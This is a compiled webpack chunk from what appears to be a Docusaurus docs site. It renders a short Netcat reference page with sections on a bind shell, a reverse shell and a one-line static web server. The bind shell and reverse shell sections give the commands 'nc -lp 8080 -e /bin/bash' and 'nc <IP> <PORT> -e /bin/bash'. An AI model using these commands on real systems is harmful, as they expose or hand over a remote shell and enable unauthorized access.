"use strict";
(self.webpackChunkdocs = self.webpackChunkdocs || []).push([
  [9727],
  {
    5486: (e, t, n) => {
      n.r(t),
        n.d(t, {
          assets: () => p,
          contentTitle: () => s,
          default: () => m,
          frontMatter: () => r,
          metadata: () => c,
          toc: () => d,
        });
      var o = n(7462),
        a = n(3366),
        l = (n(7294), n(3905)),
        i = (n(828), ["components"]),
        r = {},
        s = "Netcat",
        c = {
          unversionedId: "unix/tools/netcat",
          id: "unix/tools/netcat",
          title: "Netcat",
          description: "Netcat is a utility for networking over",
          source: "@site/docs/unix/tools/netcat.md",
          sourceDirName: "unix/tools",
          slug: "/unix/tools/netcat",
          permalink: "/docs/unix/tools/netcat",
          draft: !1,
          tags: [],
          version: "current",
          frontMatter: {},
          sidebar: "tutorialSidebar",
          previous: {
            title: "journalctl",
            permalink: "/docs/unix/tools/journalctl",
          },
          next: { title: "OpenRC", permalink: "/docs/unix/tools/openrc" },
        },
        p = {},
        d = [
          { value: "Bind shell", id: "bind-shell", level: 2 },
          { value: "Reverse shell", id: "reverse-shell", level: 2 },
          { value: "Web server", id: "web-server", level: 2 },
        ],
        u = { toc: d };
      function m(e) {
        var t = e.components,
          n = (0, a.Z)(e, i);
        return (0, l.kt)(
          "wrapper",
          (0, o.Z)({}, u, n, { components: t, mdxType: "MDXLayout" }),
          (0, l.kt)("h1", { id: "netcat" }, "Netcat"),
          (0, l.kt)(
            "p",
            null,
            (0, l.kt)("strong", { parentName: "p" }, "Netcat"),
            " is a utility for networking over\n",
            (0, l.kt)(
              "a",
              { parentName: "p", href: "/docs/network/protocols/tcp" },
              "TCP"
            ),
            " and ",
            (0, l.kt)(
              "a",
              { parentName: "p", href: "/docs/network/protocols/udp" },
              "UDP"
            ),
            ".\nIt similar to ",
            (0, l.kt)(
              "a",
              { parentName: "p", href: "/docs/unix/tools/socat" },
              "Socat"
            ),
            ", albeit more simplistic and more often bundled\ninto distros by default. Note that there are several implementations of Netcat\nand options between the different implementations may vary."
          ),
          (0, l.kt)("h2", { id: "bind-shell" }, "Bind shell"),
          (0, l.kt)(
            "p",
            null,
            "One can create a simplistic bind shell with Netcat using the following command:"
          ),
          (0, l.kt)(
            "pre",
            null,
            (0, l.kt)(
              "code",
              { parentName: "pre" },
              "nc -lp 8080 -e /bin/bash\n"
            )
          ),
          (0, l.kt)("h2", { id: "reverse-shell" }, "Reverse shell"),
          (0, l.kt)(
            "p",
            null,
            "To initiate a reverse shell, run the following command:"
          ),
          (0, l.kt)(
            "pre",
            null,
            (0, l.kt)(
              "code",
              { parentName: "pre" },
              "nc <IP> <PORT> -e /bin/bash\n"
            )
          ),
          (0, l.kt)("h2", { id: "web-server" }, "Web server"),
          (0, l.kt)(
            "p",
            null,
            "One can run a basic static file web server using the following (note that the\n",
            (0, l.kt)("inlineCode", { parentName: "p" }, "-N"),
            " option is unique to the OpenBSD implementation):"
          ),
          (0, l.kt)(
            "pre",
            null,
            (0, l.kt)(
              "code",
              { parentName: "pre", className: "language-sh" },
              "while true; do printf 'HTTP/1.1 200 OK\\n\\n%s' \"$(cat index.html)\" | nc -l 80 -N; done\n"
            )
          )
        );
      }
      m.isMDXComponent = !0;
    },
  },
]);
